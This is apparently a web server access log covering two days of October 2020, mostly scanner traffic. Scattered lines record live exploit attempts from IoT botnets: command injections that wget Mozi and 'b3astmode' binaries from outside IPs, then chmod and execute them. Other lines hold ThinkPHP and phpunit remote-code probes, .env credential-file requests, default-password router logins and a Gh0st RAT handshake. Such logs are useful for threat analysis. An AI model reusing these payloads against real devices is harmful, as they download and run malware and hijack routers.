162.142.125.49 - - [14/Oct/2020:01:11:18 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
162.142.125.49 - - [14/Oct/2020:01:11:18 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.193.5.58 - - [14/Oct/2020:02:15:13 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
213.81.209.65 - - [14/Oct/2020:02:39:41 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:03:05:14 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2.57.122.20 - - [14/Oct/2020:03:11:08 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
94.242.26.158 - - [14/Oct/2020:05:11:59 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
45.141.84.174 - - [14/Oct/2020:06:08:33 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
163.172.66.130 - - [14/Oct/2020:10:11:29 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\x19\xE7\x0B" 400 166 "-" "-"
200.58.83.223 - - [14/Oct/2020:10:38:32 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.118.53.210 - - [14/Oct/2020:12:01:35 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
116.249.91.194 - - [14/Oct/2020:12:28:19 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
221.13.12.125 - - [14/Oct/2020:12:28:19 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
180.95.231.6 - - [14/Oct/2020:12:28:20 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
221.15.238.27 - - [14/Oct/2020:13:32:18 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 134 "-" "Hello, World"
221.15.238.27 - - [14/Oct/2020:13:32:18 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"
192.241.238.111 - - [14/Oct/2020:13:49:56 +0000] "GET /portal/redlion HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
78.175.222.245 - - [14/Oct/2020:14:08:56 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
67.207.84.213 - - [14/Oct/2020:14:34:54 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
67.207.84.213 - - [14/Oct/2020:14:34:54 +0000] "GET /vendor/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
67.207.84.213 - - [14/Oct/2020:14:34:54 +0000] "GET /storage/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
67.207.84.213 - - [14/Oct/2020:14:34:54 +0000] "GET /public/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
67.207.84.213 - - [14/Oct/2020:14:34:54 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.66.130 - - [14/Oct/2020:14:57:48 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
92.118.161.1 - - [14/Oct/2020:15:02:51 +0000] "GET / HTTP/1.1" 200 612 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
171.120.156.254 - - [14/Oct/2020:15:15:27 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
1.202.114.184 - - [14/Oct/2020:15:15:27 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
175.184.166.86 - - [14/Oct/2020:15:15:30 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
45.148.121.85 - - [14/Oct/2020:15:17:58 +0000] "HEAD /robots.txt HTTP/1.0" 404 0 "-" "-"
202.83.42.247 - - [14/Oct/2020:15:50:38 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 134 "-" "Hello, World"
202.83.42.247 - - [14/Oct/2020:15:50:40 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"
213.202.223.223 - - [14/Oct/2020:16:52:08 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
186.71.10.117 - - [14/Oct/2020:17:27:00 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
190.10.166.255 - - [14/Oct/2020:17:52:27 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
181.175.212.154 - - [14/Oct/2020:17:58:51 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
193.27.228.27 - - [14/Oct/2020:18:29:54 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:18:30:04 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:18:32:05 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:18:35:08 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:18:36:22 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:19:00:55 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
176.215.254.195 - - [14/Oct/2020:19:01:26 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
177.200.90.186 - - [14/Oct/2020:19:21:45 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
74.120.14.36 - - [14/Oct/2020:19:26:50 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
74.120.14.36 - - [14/Oct/2020:19:26:50 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
139.162.106.181 - - [14/Oct/2020:19:27:06 +0000] "GET / HTTP/1.1" 200 612 "-" "HTTP Banner Detection (https://security.ipip.net)"
196.52.43.130 - - [14/Oct/2020:19:32:46 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
185.142.236.43 - - [14/Oct/2020:19:36:29 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.43 - - [14/Oct/2020:19:36:32 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "-"
185.142.236.43 - - [14/Oct/2020:19:36:34 +0000] "GET /sitemap.xml HTTP/1.1" 404 162 "-" "-"
185.142.236.43 - - [14/Oct/2020:19:36:35 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 162 "-" "-"
185.142.236.43 - - [14/Oct/2020:19:36:42 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
34.76.47.142 - - [14/Oct/2020:19:36:53 +0000] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.24.0"
193.27.228.27 - - [14/Oct/2020:20:04:00 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.160.198.90 - - [14/Oct/2020:20:13:46 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:20:21:25 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.20.31 - - [14/Oct/2020:20:54:32 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
218.59.31.35 - - [14/Oct/2020:23:33:41 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 162 "-" "-"
190.246.179.64 - - [15/Oct/2020:00:10:26 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.118.53.202 - - [15/Oct/2020:03:13:57 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
119.162.195.174 - - [15/Oct/2020:03:49:36 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 166 "-" "-"
2.184.130.72 - - [15/Oct/2020:04:38:26 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
189.1.179.13 - - [15/Oct/2020:04:59:19 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
182.121.94.153 - - [15/Oct/2020:06:30:24 +0000] "POST /HNAP1/ HTTP/1.0" 404 162 "-" "-"
190.154.218.51 - - [15/Oct/2020:06:58:15 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
181.175.225.72 - - [15/Oct/2020:06:58:35 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
169.45.99.50 - - [15/Oct/2020:08:14:34 +0000] "GET /api/4 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
41.213.138.16 - - [15/Oct/2020:08:44:56 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "B4ckdoor-owned-you"
41.213.138.16 - - [15/Oct/2020:08:44:56 +0000] "7%3b%23&remoteSubmit=Save" 400 166 "-" "-"
190.128.154.222 - - [15/Oct/2020:09:02:02 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
190.128.154.222 - - [15/Oct/2020:09:02:04 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
121.57.224.131 - - [15/Oct/2020:09:17:43 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
221.11.51.20 - - [15/Oct/2020:09:17:44 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
113.206.130.230 - - [15/Oct/2020:09:17:45 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
185.39.11.105 - - [15/Oct/2020:09:25:30 +0000] "GET http://example.com/ HTTP/1.1" 200 396 "-" "Go-http-client/1.1"
203.243.142.120 - - [15/Oct/2020:10:15:55 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 162 "-" "-"
71.58.108.140 - - [15/Oct/2020:11:46:47 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
13.65.151.245 - - [15/Oct/2020:12:14:33 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.65.151.245 - - [15/Oct/2020:12:14:34 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
27.213.180.104 - - [15/Oct/2020:12:16:49 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 162 "-" "-"
79.137.95.104 - - [15/Oct/2020:12:20:01 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
167.248.133.51 - - [15/Oct/2020:12:42:15 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
167.248.133.51 - - [15/Oct/2020:12:42:16 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
217.169.63.238 - - [15/Oct/2020:12:43:14 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
41.213.138.16 - - [15/Oct/2020:12:50:40 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "B4ckdoor-owned-you"
41.213.138.16 - - [15/Oct/2020:12:50:40 +0000] "7%3b%23&remoteSubmit=Save" 400 166 "-" "-"
165.232.100.48 - - [15/Oct/2020:12:54:53 +0000] "GET /login HTTP/1.1" 404 134 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
192.241.214.210 - - [15/Oct/2020:13:29:29 +0000] "GET /hudson HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
116.198.198.71 - - [15/Oct/2020:13:43:55 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "Sa0aS-owned-you"
116.198.198.71 - - [15/Oct/2020:13:43:55 +0000] "aS.arm7;./Sa0aS.arm7;rm+-rf+Sa0aS.arm7%3b%23&remoteSubmit=Save" 400 166 "-" "-"
194.169.193.24 - - [15/Oct/2020:14:14:12 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.143.221.12 - - [15/Oct/2020:14:34:35 +0000] "GET /admin/config.php?password%5B0%5D=admin&username=admin HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36"
66.240.205.34 - - [15/Oct/2020:14:49:55 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"
182.114.20.189 - - [15/Oct/2020:14:50:32 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.114.20.189:46811/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 162 "-" "Hello, world"
91.193.5.58 - - [15/Oct/2020:15:10:42 +0000] "GET /1qDv HTTP/1.1" 400 166 "-" "-"
112.248.96.163 - - [15/Oct/2020:15:37:07 +0000] "POST /HNAP1/ HTTP/1.0" 404 162 "-" "-"
149.28.120.71 - - [15/Oct/2020:17:31:32 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.28.120.71 - - [15/Oct/2020:17:31:32 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.232.195.136 - - [15/Oct/2020:17:36:34 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
181.143.101.194 - - [15/Oct/2020:17:58:08 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "Hello, World"
181.143.101.194 - - [15/Oct/2020:17:58:08 +0000] "" 400 0 "-" "-"
91.234.62.25 - - [15/Oct/2020:19:28:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
193.138.154.6 - - [15/Oct/2020:19:43:57 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
115.233.218.202 - - [15/Oct/2020:19:57:43 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
128.14.134.134 - - [15/Oct/2020:20:09:41 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
181.143.101.194 - - [15/Oct/2020:20:16:52 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "Hello, World"
181.143.101.194 - - [15/Oct/2020:20:16:52 +0000] "" 400 0 "-" "-"
89.233.219.46 - - [15/Oct/2020:20:50:12 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 134 "-" "Sa0aS-owned-you"
89.233.219.46 - - [15/Oct/2020:20:50:12 +0000] "aS.arm7;./Sa0aS.arm7;rm+-rf+Sa0aS.arm7%3b%23&remoteSubmit=Save" 400 166 "-" "-"
103.242.61.9 - - [15/Oct/2020:21:15:35 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
149.28.120.71 - - [15/Oct/2020:21:15:54 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.28.120.71 - - [15/Oct/2020:21:15:54 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
114.32.119.220 - - [15/Oct/2020:21:54:48 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
46.227.8.71 - - [15/Oct/2020:21:58:25 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
71.6.232.9 - - [15/Oct/2020:22:05:03 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
92.118.160.49 - - [15/Oct/2020:22:24:24 +0000] "GET / HTTP/1.0" 200 612 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
139.162.106.181 - - [15/Oct/2020:22:30:06 +0000] "GET / HTTP/1.1" 200 612 "-" "HTTP Banner Detection (https://security.ipip.net)"
192.241.232.162 - - [15/Oct/2020:22:54:27 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
61.219.11.153 - - [15/Oct/2020:23:01:28 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
40.76.33.107 - - [15/Oct/2020:23:18:48 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.76.33.107 - - [15/Oct/2020:23:18:52 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
222.94.163.8 - - [15/Oct/2020:23:24:47 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
2.57.122.193 - - [16/Oct/2020:01:24:52 +0000] "GET / HTTP/1.1" 200 396 "-" "Linux Gnu (cow)"
83.97.20.31 - - [16/Oct/2020:02:16:45 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
59.93.17.253 - - [16/Oct/2020:02:20:18 +0000] "POST /HNAP1/ HTTP/1.0" 404 162 "-" "-"
41.57.7.120 - - [16/Oct/2020:02:37:47 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
39.71.79.190 - - [16/Oct/2020:03:07:50 +0000] "POST /HNAP1/ HTTP/1.0" 404 162 "-" "-"
91.193.5.58 - - [16/Oct/2020:03:52:25 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
103.75.165.155 - - [16/Oct/2020:03:53:47 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
193.118.53.194 - - [16/Oct/2020:05:15:14 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
182.113.217.236 - - [16/Oct/2020:06:40:28 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.217.236:50911/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
190.128.154.222 - - [16/Oct/2020:07:23:36 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
190.128.154.222 - - [16/Oct/2020:07:23:38 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
125.41.5.42 - - [16/Oct/2020:08:08:13 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.95.169.241/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1" 404 162 "-" "Hello, world"
91.193.5.58 - - [16/Oct/2020:09:30:05 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xBA\xF7\x95\xB7m\xE7\xEF\xF1h\xB5z\x00\xC5\x03\xC9\x83\xA3\x89\xBA\x05\x1D\xE5\xED\x96\xEB\xC7\xF6?\x7F~\xAB\xF5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
173.212.225.214 - - [16/Oct/2020:10:29:12 +0000] "GET / HTTP/1.1" 200 612 "-" "libwww-perl/6.47"
89.46.238.226 - - [16/Oct/2020:11:38:10 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
